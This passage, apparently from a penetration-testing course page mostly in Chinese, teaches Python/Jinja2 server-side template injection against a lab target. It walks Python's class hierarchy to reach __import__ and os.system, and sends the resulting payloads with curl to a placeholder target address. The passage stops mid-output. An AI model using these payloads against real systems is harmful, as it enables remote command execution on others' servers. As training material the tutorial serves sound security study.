<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.__class__.__class__</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">'type'</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.__class__.__base__</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">'object'</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.__class__.__base__.__subclasses__()</span><br><span class="line"></span><br><span class="line">[&lt;<span class="keyword">class</span> <span class="string">'type'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'weakref'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'weakcallableproxy'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'weakproxy'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'int'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'bytearray'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'bytes'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'list'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'NoneType'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'NotImplementedType'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'traceback'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'super'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'range'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_keys'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_values'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_items'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_reversekeyiterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_reversevalueiterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_reverseitemiterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'odict_iterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'set'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'str'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'slice'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'staticmethod'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'complex'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'float'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'frozenset'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'property'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'managedbuffer'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'memoryview'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'tuple'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'enumerate'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'reversed'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'stderrprinter'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'code'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'frame'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'builtin_function_or_method'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'method'</span>&gt;,</span><br><span class="line"> &lt;SNIP&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.__class__.mro()[<span class="number">1</span>].__subclasses__()</span><br><span class="line"></span><br><span class="line">[&lt;<span class="keyword">class</span> <span class="string">'type'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'weakref'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'weakcallableproxy'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'weakproxy'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'int'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'bytearray'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'bytes'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'list'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'NoneType'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'NotImplementedType'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'traceback'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'super'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'range'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_keys'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_values'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_items'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_reversekeyiterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_reversevalueiterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_reverseitemiterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'odict_iterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'set'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'str'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'slice'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'staticmethod'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'complex'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'float'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'frozenset'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'property'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'managedbuffer'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'memoryview'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'tuple'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'enumerate'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'reversed'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'stderrprinter'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'code'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'frame'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'builtin_function_or_method'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'method'</span>&gt;,</span><br><span class="line"> &lt;SNIP&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>现在，让我们寻找一些可以促进远程代码执行的有用类。</p>
<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = s.__class__.mro()[<span class="number">1</span>].__subclasses__()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):<span class="built_in">print</span>(i, x[i].__name__)</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span> <span class="built_in">type</span></span><br><span class="line"><span class="number">1</span> weakref</span><br><span class="line"><span class="number">2</span> weakcallableproxy</span><br><span class="line"><span class="number">3</span> weakproxy</span><br><span class="line"><span class="number">4</span> <span class="built_in">int</span></span><br><span class="line"><span class="number">5</span> <span class="built_in">bytearray</span></span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span></span><br><span class="line"><span class="number">7</span> <span class="built_in">list</span></span><br><span class="line"><span class="number">8</span> NoneType</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">searchfunc</span>(<span class="params">name</span>):</span><br><span class="line"><span class="meta">... </span>    x = s.__class__.mro()[<span class="number">1</span>].__subclasses__()</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line"><span class="meta">... </span>            fn = x[i].__name__</span><br><span class="line"><span class="meta">... </span>            <span class="keyword">if</span> fn.find(name) &gt; -<span class="number">1</span>:</span><br><span class="line"><span class="meta">... </span>                    <span class="built_in">print</span>(i, fn)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>searchfunc(<span class="string">'warning'</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">215</span> catch_warnings</span><br></pre></td></tr></tbody></table></figure>

<p>你可能会问，为什么要搜索<code>warning</code>。我们选择这个类是因为它导入了Python的<a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/3.9/Lib/warnings.py#L3">sys模块</a>，从<code>sys</code>可以到达<code>os</code>模块。更准确地说，os模块都来自<code>warnings.catch_</code>。</p>
<p>请注意，您可能会遇到不同的号码。回到我们的Python for SSTI细节，我们已经看到<code>catch_warnings</code>存在，而没有将任何额外的模块导入到我们的Python控制台。让我们枚举这个类的内置程序，如下所示。</p>
<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>y = x[<span class="number">215</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>y</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">'warnings.catch_warnings'</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>y()._module.__builtins__</span><br><span class="line"></span><br><span class="line">{<span class="string">'__name__'</span>: <span class="string">'builtins'</span>, <span class="string">'__doc__'</span>: <span class="string">"Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices."</span>, <span class="string">'__package__'</span>: <span class="string">''</span>, <span class="string">'__loader__'</span>: &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib.BuiltinImporter'</span>&gt;, <span class="string">'__spec__'</span>: ModuleSpec(name=<span class="string">'builtins'</span>, loader=&lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib.BuiltinImporter'</span>&gt;), <span class="string">'__build_class__'</span>: &lt;built-<span class="keyword">in</span> function __build_class__&gt;, <span class="string">'__import__'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">__import__</span>&gt;, <span class="string">'abs'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">abs</span>&gt;, <span class="string">'all'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">all</span>&gt;, <span class="string">'any'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">any</span>&gt;, <span class="string">'ascii'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">ascii</span>&gt;, <span class="string">'bin'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">bin</span>&gt;, <span class="string">'breakpoint'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">breakpoint</span>&gt;, <span class="string">'callable'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">callable</span>&gt;, <span class="string">'chr'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">chr</span>&gt;, <span class="string">'compile'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">compile</span>&gt;, <span class="string">'delattr'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">delattr</span>&gt;, <span class="string">'dir'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">dir</span>&gt;, <span class="string">'divmod'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">divmod</span>&gt;, <span class="string">'eval'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;, <span class="string">'exec'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">exec</span>&gt;, <span class="string">'format'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">format</span>&gt;, <span class="string">'getattr'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">getattr</span>&gt;, <span class="string">'globals'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">globals</span>&gt;,</span><br><span class="line"> &lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>z = y()._module.__builtins__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> z:</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">if</span> i.find(<span class="string">'import'</span>) &gt;-<span class="number">1</span>:</span><br><span class="line"><span class="meta">... </span>            <span class="built_in">print</span>(i, z[i])</span><br><span class="line">...	</span><br><span class="line"><span class="built_in">__import__</span> &lt;built-<span class="keyword">in</span> function <span class="built_in">__import__</span>&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>看起来我们已经通过遍历层次结构到达了导入功能。这意味着我们可以加载<code>os</code>并使用<code>system</code>函数来执行所有来自字符串对象的代码，如下所示。</p>
<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()</span><br><span class="line"></span><br><span class="line">[<span class="number">215</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'echo RCE from a string object'</span>)</span><br><span class="line">RCE <span class="keyword">from</span> a string <span class="built_in">object</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></tbody></table></figure>

<p>回到我们易受攻击的Web应用程序，让我们看看如何重复相同的过程并开发RCE有效负载。请记住，下面的有效载荷可以通过浏览器提交给应用程序，也可以通过URL编码后的cURL提交给应用程序。</p>
<p>Payload:</p>
<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">{{ <span class="string">''</span>.__class__ }}</span><br></pre></td></tr></tbody></table></figure>

<h4 id="Curl-Interacting-with-the-Target-2"><a href="#Curl-Interacting-with-the-Target-2" class="headerlink" title="Curl - Interacting with the Target"></a>Curl - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -gs "http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%7B%20%27%27.__class__%20%7D%7D"</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div id="desktop"&gt;</span><br><span class="line">		&lt;div class="window" data-title="Run"&gt;</span><br><span class="line">			&lt;form action="/execute" method="get"&gt;</span><br><span class="line">				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;a&gt;&amp;lt;class &amp;#39;str&amp;#39;&amp;gt;&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;input type="submit" value="execute"&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<h4 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h4><p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">{{ <span class="string">''</span>.__class__.__mro__ }}</span><br></pre></td></tr></tbody></table></figure>

<h4 id="Curl-Interacting-with-the-Target-3"><a href="#Curl-Interacting-with-the-Target-3" class="headerlink" title="Curl - Interacting with the Target"></a>Curl - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -gs "http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D"</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div id="desktop"&gt;</span><br><span class="line">		&lt;div class="window" data-title="Run"&gt;</span><br><span class="line">			&lt;form action="/execute" method="get"&gt;</span><br><span class="line">				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;a&gt;(&amp;lt;class &amp;#39;str&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;object&amp;#39;&amp;gt;)&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;input type="submit" value="execute"&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>我们对第二个项目感兴趣，因此有效载荷应变为：</p>
<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">{{ <span class="string">''</span>.__class__.__mro__[<span class="number">1</span>] }}      </span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -gs "http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D"</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div id="desktop"&gt;</span><br><span class="line">		&lt;div class="window" data-title="Run"&gt;</span><br><span class="line">			&lt;form action="/execute" method="get"&gt;</span><br><span class="line">				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;a&gt;&amp;lt;class &amp;#39;object&amp;#39;&amp;gt;&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;input type="submit" value="execute"&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>让我们开始沿着层次结构往下走，如下所示。</p>
<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">{{ <span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__() }}        </span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -gs "http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%20%7D%7D"</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div id="desktop"&gt;</span><br><span class="line">		&lt;div class="window" data-title="Run"&gt;</span><br><span class="line">			&lt;form action="/execute" method="get"&gt;</span><br><span class="line">				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;a&gt;[&amp;lt;class &amp;#39;type&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;weakref&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;weakcallableproxy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;weakproxy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;int&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;bytearray&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;bytes&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;list&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;NoneType&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;NotImplementedType&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;traceback&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;super&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;range&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_keys&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_values&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_items&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_reversekeyiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_reversevalueiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_reverseitemiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;odict_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;set&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;str&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;slice&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;staticmethod&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;complex&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;float&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;frozenset&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;property&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;managedbuffer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;memoryview&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tuple&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;enumerate&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;reversed&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;stderrprinter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;code&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;frame&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;builtin_function_or_method&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;method&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;function&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;mappingproxy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;generator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;getset_descriptor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;wrapper_descriptor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;method-wrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;ellipsis&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;member_descriptor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;types.SimpleNamespace&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;PyCapsule&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;longrange_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;cell&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;instancemethod&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;classmethod_descriptor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;method_descriptor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;callable_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pickle.PickleBuffer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;coroutine&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;coroutine_wrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;InterpreterID&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;EncodingMap&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;fieldnameiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;formatteriterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;BaseException&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;hamt&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;hamt_array_node&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;hamt_bitmap_node&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;hamt_collision_node&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;keys&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;values&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;items&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;Context&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;ContextVar&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;Token&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;Token.MISSING&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;moduledef&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;module&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;filter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;map&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;zip&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib._ModuleLock&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib._DummyModuleLock&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib._ModuleLockManager&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib.ModuleSpec&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib.BuiltinImporter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;classmethod&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib.FrozenImporter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib._ImportLockContext&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_thread._localdummy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_thread._local&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_thread.lock&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_thread.RLock&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_io._IOBase&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_io._BytesIOBuffer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_io.IncrementalNewlineDecoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;posix.ScandirIterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;posix.DirEntry&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external.WindowsRegistryFinder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external._LoaderBasics&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external.FileLoader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external._NamespacePath&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external._NamespaceLoader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external.PathFinder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external.FileFinder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;zipimport.zipimporter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;zipimport._ZipImportResourceReader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;codecs.Codec&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;codecs.IncrementalEncoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;codecs.IncrementalDecoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;codecs.StreamReaderWriter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;codecs.StreamRecoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_abc_data&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;abc.ABC&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_itemiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.Hashable&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.Awaitable&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.AsyncIterable&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;async_generator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.Iterable&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;bytes_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;bytearray_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_keyiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_valueiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;list_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;list_reverseiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;range_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;set_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;str_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tuple_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.Sized&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.Container&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.Callable&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;os._wrap_close&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sitebuiltins.Quitter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sitebuiltins._Printer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sitebuiltins._Helper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;operator.itemgetter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;operator.attrgetter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;operator.methodcaller&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.accumulate&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.combinations&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.combinations_with_replacement&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.cycle&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.dropwhile&amp;#39;&amp;gt;, 